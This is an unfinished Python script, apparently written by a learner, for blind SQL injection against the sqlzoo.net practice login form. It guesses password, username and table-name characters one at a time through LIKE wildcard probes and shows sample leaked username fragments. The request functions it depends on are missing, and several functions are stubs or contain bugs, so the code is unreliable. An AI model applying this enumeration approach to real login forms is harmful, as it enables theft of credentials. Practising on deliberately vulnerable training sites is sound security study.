import itertools
import re

# https://stackoverflow.com/questions/54621596/include-both-single-quote-and-double-quote-in-python-string-variable
# https://stackoverflow.com/questions/54620287/how-to-include-both-single-and-double-quotes-in-the-same-string-variable-in-pyth
# special = {|}~[\]^_`!"#$%&'()*+,-./:;<=>?@)
# so use .join or """ i guess?
# special = ''.join("{|}~[\]^`!#$&'()*+,-./:;<=>?@)") + '"'
special = " ".join("{|}~[\]^`!#$&()*+,-./:;<=>?@)").split()
special.append(" ")
lower = " ".join("abcdefghijklmnopqrstuvwxyz").split()
upper = " ".join("ABCDEFGHIJKLMNOPQRSTUVWXYZ").split()
numbers = " ".join("0123456789").split()

# lower = [ "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" ]
# upper = [ "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ]
# numbers = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" ]
# special = [ "{", "|", "}", "~", "[", "\", "]", "^", "`", "!", '#', '$', '&', "'", " ", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?", "@", ")", """, ")", "+", '"' ]

# https://stackoverflow.com/questions/28056843/special-characters-in-string-literals#28056873
other = []
wildcards = ["_", "%"]


def assignCharacters(otherChars, where):
   """makes variables for subsets of the unicode char sets
   
   Args:
      otherChars: string or list
         additional characters to concatenate with the variable where
      where: variable -- string or list
         which variable to concatenate with otherChars
   
   Returns: 
      where:
         where concatenated with otherChars
   
   """
   if(isinstance(otherChars, list)):
       where.append(otherChars)
   if(isinstance(otherChars, str)):
       tmp = " ".join(otherChars).split()
       where.append(tmp)


       
#   return where
   
# Type checking:   
# https://stackoverflow.com/questions/1835018/how-to-check-if-an-object-is-a-list-or-tuple-but-not-string#1835044
# https://stackoverflow.com/questions/26544091/checking-if-type-list-in-python

# Global Variables:
# https://stackoverflow.com/questions/423379/using-global-variables-in-a-function
# Unbound Local Error:
# https://stackoverflow.com/questions/9264763/dont-understand-why-unboundlocalerror-occurs
# Variable Scope:
# https://stackoverflow.com/questions/370357/python-variable-scope-error



def makeList(username, url, caseSensitive = False, wildCards = True):
   """checks for common characters in the password and returns the characters contained somewhere in the password string

   characters: a-z 0-9 "{|}~[\]^_`!#$%&'()*+,-./:;<=>?@)
      if caseSensitive = True: A-Z
   
   Args:
      username: string
         valid username to check password
      url: string
         url to form to check
      caseSensitive: boolean (optional)
         Set to true to check uppercase and lowercase versions of the characters
      wildCards: boolean (optional)
         default true
         Set to false to disallow wildcards -- not currently recommended, may cause unexpected code failures

   Returns:
      charList:
         list of the characters in the password. 
         
         Note: also returned _ and %. Took those characters out of the character set for now. Add em back later:
         https://stackoverflow.com/questions/8764370/escaping-special-characters-in-sql
         https://www.techonthenet.com/sql/like.php

   """
   charList = []
   for ch in lower:
      # check for ch in 
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in numbers:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in special:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   for ch in other:
      if(checkPasswordCharacter(str(ch), username, url)):
         charList.append(str(ch))
         print(ch)
   if(caseSensitive):
      for ch in upper:
         if(checkPasswordCharacter(str(ch), username, url)):
            charList.append(str(ch))
            print(ch)
   if(wildCards):
      for ch in wildcards:
         if(checkPasswordCharacter(str(ch), username, url)):
            charList.append(str(ch))
            print(ch)
   return charList



def checkPass(username, url, charList, n):
   """checks for a character in position i, and records it when the character at postion i was found.
      
      Args:
         username:

         url:

         charList: list of valid characters from the password

         n: integer
            max size of passwords to check. will stop checking and return current progress if n < len(password)

      Returns:
         i: integer
            prints i iff there is no character in charList that matches at position i. also raises type and value error after printing i -- printing is handled by findChar
         password: string
            correct password or, if len(password) = n, first n characters of password
            if no characters match and wildcards are in the charList (wildCards is True), _ will be substituted in since it matches every single character.
            otherwise, if no characters match, that character will be skipped, and it's index is printed (e.g. Missing: 6) 

      Raises:
         TypeError: exception
            raised with ValueErrors when findChar returns i instead of an element of CharList
         ValueError: exception 
            raised when no character in charList is correct.

   https://stackoverflow.com/questions/2052390/manually-raising-throwing-an-exception-in-python
   
   Note: not working as hoped. Perhaps I need to change the other functions to always return a str? Maybe a place holder string like _ for now? 

   """
   # dikt = {}
   password = ""
   for i in range(0, n):
      if(testPassword(password, username, url)):
         return password #password is found!       
       # https://stackoverflow.com/questions/189645/how-to-break-out-of-multiple-loops-in-python
      ch = findChar(username, url, charList, i)
      # if(isinstance(ch, int))#if ch is int i, can't find a matching character at index i in password string 
      # use try except instead of if(isinstance(ch, int)):
      # https://stackoverflow.com/questions/3501382/checking-whether-a-variable-is-an-integer-or-not
      try: 
         password += ch
      except TypeError:
         # print(i)
         password += str(ch) #should be blank
         # raise ValueError("index i has no matching character")
   return password #only reached if password is too long for the given n


def findChar(username, url, charList, i):
   """helper function for checkPass
   returns the first element of charList found that works for the password at index i
   if it fails to find a character at i, prints i and returns an empty string instead of returning i.
   """
   for ch in charList:
         if(checkPasswordCharacter(ch, username, url, index = i)):
            return ch
   #only runs if no ch in charList match:
   # return i #oof, there's no match if i is out of bounds, e.g. len(password) < i
   print("Missing: " + i) #so I know when it's not a match
   return "" #return an empty string instead
   # Note to self: should not return an _ because it'll match an _ if wildCards are true (default). 
   # If wildCards is false, this will just skip characters that don't match anything!

"""
   Strategy:
   
   if findChar returns i -  meaning checkPass will print i then raise a type and a value error -
   then perhaps check all unicode characters for the password at index i and add the one that works to the charaters checked and rerun the script
   
"""

def makeTableList(url, caseSensitive = False, wildCards = True):
   """ List of characters in table names
   
   Args:
      url: String
         form url
      caseSensitive: Boolean
         default False
         true if case sentitivity matters
      wildCards: Boolean
         default True
         true if wildcards should be placed where no other characters match

   Returns:
      lst: List
         list of characters in table names

   """
   charList = []
   for ch in lower:
      # ch = str(ch)
      if(characterInTableName(ch, url)):
         charList.append(ch)
   for ch in numbers:
      ch = str(ch)
      if(characterInTableName(ch, url)):
         charList.append(ch)
   for ch in special:
      ch = str(ch)
      if(characterInTableName(ch, url)):
         charList.append(ch)
   for ch in other:
      ch = str(ch)
      if(characterInTableName(ch, url)):
         charList.append(ch)
   if(caseSensitive):
      for ch in upper:
         # ch = str(ch)
         if(characterInTableName(ch, url)):
            charList.append(ch, url)
   if(wildCards):
      for ch in wildCards:
         # ch = str(ch)
         if(characterInTableName(ch, url)):
            charList.append(ch, url)
   return charList


def makeDatabaseList():
   """ List of characters in database names

   Args:
      url: String
         form url
      caseSensitive: Boolean
         default False
         true if case sentitivity matters
      wildCards: Boolean
         default True
         true if wildcards should be placed where no other characters match

   Returns:
      lst: List
         list of characters in table names

"""
   charList = []
   for ch in lower:
      # ch = str(ch)
      if(characterInDatabaseName(ch, url)):
         charList.append(ch)
   for ch in numbers:
      ch = str(ch)
      if(characterInDatabaseName(ch, url)):
         charList.append(ch)
   for ch in special:
      ch = str(ch)
      if(characterInDatabaseName(ch, url)):
         charList.append(ch)
   for ch in other:
      ch = str(ch)
      if(characterInDatabaseName(ch, url)):
         charList.append(ch)
   if(caseSensitive):
      for ch in upper:
         # ch = str(ch)
         if(characterInDatabaseName(ch, url)):
            charList.append(ch, url)
   if(wildCards):
      for ch in wildCards:
         # ch = str(ch)
         if(characterInDatabaseName(ch, url)):
            charList.append(ch, url)
   return charList

def makeTableNamesList(n, ):
   """ List of table names
   
   Args:
      n: integer
         max number of table names to return
      

   Returns:
      lst: list
         list of up to n table names
   """



def tableName(lst, ):

   name = ""
   for i in range(0, n):
      for ch in lst:
         if(characterInTableName(ch, url, i)):
            name += ch
         else:
            name += "" #should only be reached if wildcards are false

   return name

def makeDatabaseNamesList(n, ):
   """ List of database names
   
   Args:
      n: integer
         max number of table names to return
      

   Returns:
      lst: list
         list of up to n database names

"""

def makeListF(f, url, *argsf, caseSensitive = False, wildCards = True):
   """makeList generalized to use the boolean function f.

   Args:
      argsf: list
         sole list argument of the function f.
   Returns:
      lst: list of valid characters as determined by the boolean function f

   """

def userNameCharacters(url, tableName, caseSensitive = False, wildCards = True):
   """ returns list of characters that appear in any username
   

   """
   """
sqlzoo characters
['a', 'c', 'd', 'e', 'h', 'i', 'j', 'k', 'n', 'o', 'p', 'r', 't', 'w', '_', '%']
"""
   lst = []

   for ch in special:
      if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
         lst.append(ch)
   for ch in lower:
      if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
         lst.append(ch)
   for ch in numbers:
      if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
         lst.append(ch)
   for ch in other:
      if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
         lst.append(ch)
   if(caseSensitive):
      for ch in upper:
         if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index")):
            lst.append(ch)
   if(wildCards):
      for ch in wildcards:
         lst.append(ch) #it'll match if there's users
   return lst

def userLists(n, tableName, url, characterList):
   """
   Assumption: usernames are unique. 

   Args:
      n: integer
         max password length
      tableName: string
         name of table with usernames
      url: string
         url of vulnerable form
      characterList:
         list of characters in one or more usernames

   Returns:
      lstNested: list of lists
         returns a list of up to n lists, each sublist i contatins characters
         from characterList that match at least one username at index i in the 
         username strings 
         (e.g. lst = [[a], [b,c], [d]] could correspond to a, ab, ac, abd, acd)

   Raises:


   """
   lstNested = []
   for i in range(0, n):
      lst = []
      for ch in characterList:
         if(checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = i)):
            lst.append(ch)
      if(len(lst) == 0 or lst[0] == "%"):
         break
      lstNested.append(lst)
   return lstNested
   """
   max(len(username)) is 9. So userLists(12, tab) returns a list with 9 lists (0-8) 
   matching letters, and both wildcards; the 9th matches only '%' 
   i.e. the 0 or more character wildcard and after that returns empty lists.
   This makes sense b/c as i increases, so does the number of single character matches increases. 
   So, for i = 2 there's "_" + ch
   So changing it to now check if the sublist has the zero or more character wildcard 
   character first or an empty list and breaking if either of those is found.
   Empty list would happen if wildcards were not included in the characterList
   """

"""
Maybe I should test sequences. So if a, b, c, d, and e match (from userNameCharacters)
then test ab, ac, ad, ae, etc. and put use those as building blocks.
Then build strings that conform to those parameters.
Hmmm, that might not be too useful for large databases,
unless it turns out usernames have nice patters.
Which seems to actually be a reasonable assumption. 
dbbdd doesn't show up in english (or any language I know of)
but dad, bad, dab, cab, bed do. Maybe usernames have some patterns too!
"""

def checkUsernameSequences(n, ch, url, tableName, minLen = 1, maxLen = 2):
   """construct sequences and use those to inform the choice of strings. So if a,b,c,d matches, check aa, ab, ac, ad, ba, bb, bc, bd, ca, cb, cc, cd, da, db, dc, dd. 
      
      Args:
         n: integer
            max number of characters in any username. -- len(userLists()) could work!
         ch: list
            characters intended to make sequences -- e.g. from userNameCharacters
            assumed all elements in list match 
         url: string
            vulnearble form
         tableName: string
            table with usernames
         minLen: int
            minimum length of sequences. will not check sequences length less than minLen 
         maxLen: int
            maximum length of the sequences. will not check sequences longer than maxLen
            default is 2
      
      Returns:
         seqLst:
            list of matching sequences
   """
   if(minLen == 1):
      strLst = ch
   # assumes all of ch is a match
   else:
      strLst = []
   for k in range(minLen, maxLen + 1):
      lst = generateSubSequences(k, ch)
      sublst = [x for x in lst if userNameLike(x, url, tableName)]
# list comprehensions with conditions:
# https://stackoverflow.com/questions/6475314/python-for-in-loop-preceded-by-a-variable
      strLst += sublst
   return strLst

"""
url = "https://sqlzoo.net/hack/passwd.pl"
tab = "users"
l = userNameCharacters(url, tab)
print(l)
   ['a', 'c', 'd', 'e', 'h', 'i', 'j', 'k', 'n', 'o', 'p', 'r', 't', 'w', '_', '%']

l.pop()
l.pop()
print(l)
   ['a', 'c', 'd', 'e', 'h', 'i', 'j', 'k', 'n', 'o', 'p', 'r', 't', 'w']

l2 = checkUsernameSequences(9, l, url, tab, 2, 2)

print(l2)
   ['ak', 'an', 'da', 'di', 'ep', 'er', 'et', 'ew', 'ha', 'ia', 'ic', 'ie', 'ja', 'ke', 'ni', 'nn', 'on', 'pe', 'pi', 'ri', 'ro', 'th', 'wd']

l3 = checkUsernameSequences(9, l, url, tab, 3, 3)

print(l3)
   ['ake', 'dan', 'die', 'epi', 'eri', 'eth', 'ewd', 'han', 'ian', 'iep', 'jak', 'nie', 'nni', 'onn', 'pew', 'pie', 'ric', 'ron', 'tha', 'wdi']

print(len(l3))
   20


"""
def generateSubSequences(k, ch):
   """
   generates all subsequences of ch with length k

   """
   seq = ["".join(c) for c in itertools.product(ch, repeat = k)]
# discussion about the best way to do this:
# https://stackoverflow.com/questions/7074051/what-is-the-best-way-to-generate-all-possible-three-letter-strings
   return seq

def userNames(lst, url, tableName):
   """ returns a list of usernames

   Args:
      lst: nested list
         nested list. Intended to be userLists. 
      url: string
         url of vulnerable form
      tableName: string
         table with usernames

   Another issue is this only checks for usernames with of a fixed length ie len(lst)
   assuming wildcards are in lst, then it still might match 
   eg if len(lst) is 6 and jane is a username, "jane%%" could match
   if I wanted to generate all the smaller lists I could use this code:
   for i in range(1,len(lst) ): 
      #won't return the lists of len(lst)
      list(itertools.permutations(lst, i))

   """
   n = len(lst)
   # https://docs.python.org/3/library/itertools.html#itertools.product
   # https://stackoverflow.com/questions/3034014/how-to-apply-itertools-product-to-elements-of-a-list-of-lists
   lst2 = list(itertools.product(*lst))
   lst3 =  list(map("".join, lst2))
   #
   # Maybe use checkUsernameSequences here,
   # then add a check to reduce the amount of possibilities before building lst?
   #

   seq = checkUsernameSequences(n, lst, url, tableName, minLen = 2, maxLen = 2)
   # does not include the single characters since minLen > 1

   lst4 = filt(seq, lst3)
   """# next time:
   find matching strings. That should (hopefully) reduce the space to search. 
   REMEMBER, this filtering will miss all single character usernames!!!

   https://docs.python.org/3/library/re.html#regular-expression-syntax
   https://stackoverflow.com/questions/3640359/regular-expressions-search-in-list
   https://stackoverflow.com/questions/3040716/python-elegant-way-to-check-if-at-least-one-regex-in-list-matches-a-string
   https://stackoverflow.com/questions/19300020/python-match-a-string-with-regex
   https://stackoverflow.com/questions/37974047/if-any-strings-in-a-list-match-regex
"""

   lst5 = [x for x in lst4 if checkUsername(x, url, tableName)]
   # lst = list(map(checkUsername, lst2))
   return lst5


def filt(seq, lst):
   """
   filters lst. returns sublist

   Args:
      seq: list
         used to build a regex for matching
      lst: list
   Returns: 
      slst: list
         elements of lst that match at least one element of seq

   """
   regex = "(" + ")|(".join(seq) + ")"
   regex = re.compile(regex)
   slst = list(filter(regex.search, lst))
   return slst


   # still need a checkUsername function 
"""
   url = "https://sqlzoo.net/hack/passwd.pl"
tab = "users"
chList = userNameCharacters(url, tab)
lst = userLists(10, tab, url, chList)
   n = 1

   for i in lst:
       n *= len(i)

   n
Out[69]: 46656000

len(chList)
Out[72]: 16

   math.factorial(16)
Out[74]: 20922789888000

   math.factorial(16)/len(lst2)
Out[75]: 448448.0

   len(lst2)
Out[76]: 46656000

   so turns out this makes a REALLY large number of requests to send a server...
"""
"""
the pattern made by itertools.product:

lst
Out[78]: 
[['a',  'c',  'd',  'e',  'h',  'i',  'j',  'k',  'n',  'o',  'p',  'r',  't',  'w', '_',  '%'],
 ['a', 'c', 'd', 'e', 'h', 'i', 'k', 'n', 'o', 'p', 'r', 't', 'w', '_', '%'],
 ['a', 'c', 'd', 'e', 'h', 'i', 'k', 'n', 'p', 'w', '_', '%'],
 ['a', 'c', 'd', 'e', 'i', 'n', 'p', '_', '%'],
 ['e', 'i', 'n', 'p', '_', '%'],
 ['e', 'i', 'p', '_', '%'],
 ['e', 'i', 'p', '_', '%'],
 ['e', 'i', '_', '%'],
 ['e', '_', '%']]

for l in lst:
    print(len(l))
16
15
12
9
6
5
5
4
3

lst2[0]
Out[94]: ('a', 'a', 'a', 'a', 'e', 'e', 'e', 'e', 'e')

lst2[1]
Out[79]: ('a', 'a', 'a', 'a', 'e', 'e', 'e', 'e', '_')

lst2[3]
Out[80]: ('a', 'a', 'a', 'a', 'e', 'e', 'e', 'i', 'e')

lst2[12]
Out[81]: ('a', 'a', 'a', 'a', 'e', 'e', 'i', 'e', 'e')

lst2[60]
Out[82]: ('a', 'a', 'a', 'a', 'e', 'i', 'e', 'e', 'e')

lst2[60*5]
Out[83]: ('a', 'a', 'a', 'a', 'i', 'e', 'e', 'e', 'e')

lst2[60*5*6]
Out[84]: ('a', 'a', 'a', 'c', 'e', 'e', 'e', 'e', 'e')

lst2[60*5*6*9]
Out[85]: ('a', 'a', 'c', 'a', 'e', 'e', 'e', 'e', 'e')

lst2[60*5*6*9*12]
Out[86]: ('a', 'c', 'a', 'a', 'e', 'e', 'e', 'e', 'e')

lst2[60*5*6*9*12*15]
Out[87]: ('c', 'a', 'a', 'a', 'e', 'e', 'e', 'e', 'e')
"""


"""
Strategy:
first find the set of characters anywhere in any username. Pass this list to userLists.
"""
"""
Strategy:

set an n (max password length)

iterate over character set n times, checking for character in positions 0 ... n -1.
Stop iterating if only wildcards match (assumes all 
wildcards means that I've exceeded the length of all
passwords, not that the passwords are all wildcards) --- wait
wouldn't nothing match in that case? Investigate! 
return a list of lists with up to n lists! 
This list can be used to find individual passwords!
"""
"""
Strategy:
Inputs: list of lists, n. n is the number of passwords to be found (nUsers can give the n for this).
nested loops testing characters in this character set? This seems like a bad idea... 
Scaling this leads to basically brute forcing the passwords with more programming logic...
There must be a better way to do this but idk...
Well maybe usernames tend to have patterns so this is still a useful reduction in the search space?
Still would prefer a better way!
"""





"""
is sql case sensitive?

it can be:
https://stackoverflow.com/questions/3969059/sql-case-sensitive-string-compare

some commands to check and alter collation:
https://stackoverflow.com/questions/14962419/is-the-like-operator-case-sensitive-with-mssql-server
https://stackoverflow.com/questions/1411161/sql-server-check-case-sensitivity
https://stackoverflow.com/questions/1831105/how-to-do-a-case-sensitive-search-in-where-clause-im-using-sql-server

"""


"""
toDo
   
   continue implementing functions

   abstract repeated functions into seperate functions: 
   pass parts that don't repeat as functions, which are just regular parameters!!!
      e.g. makeList makeTableList and makeDatabaseList can be rewriten with a function f 
      replacing checkPasswordCharacter characterInTableName characterInDatabaseName 
      and those functions being passed as the parameter f
   https://stackoverflow.com/questions/1349332/python-passing-a-function-into-another-function#1349350

"""

"""
ran python script sending network data between linux machine and sqlzoo.net
opened wireshark and captured data
looked at traffic, found DNS request from 127.0.0.1 --> 127.0.0.53
that sqlzoo.net ip address is 146.176.166.58
visited in browser
found it's a related page that links to different projects
found it's by Dr Gordon Russell of Edinburgh Napier University
so sqlzoo hacking forum is by Gordon Russell, a cyber security prof from the UK
https://www.napier.ac.uk/people/gordon-russell
makes sense -- sqlzoo.net has a blurb about sqli being illegal under UK law
Actually looks like the other pages are by other faculty at Edinburgh Napier University
e.g. https://www.soc.napier.ac.uk/~andrew/
So maybe Dr Russell wasnt the one who made that. In fact, Look at this,
http://shop.oreilly.com/product/9780596527990.do
So maybe it was Dr. Cumming and Dr. Russell? Since they're coauthors of a
SQL book (SQL Hacks 
Tips & Tools for Digging Into Your Data) 
that includes avoiding "the dreaded SQL injection attack"
"""

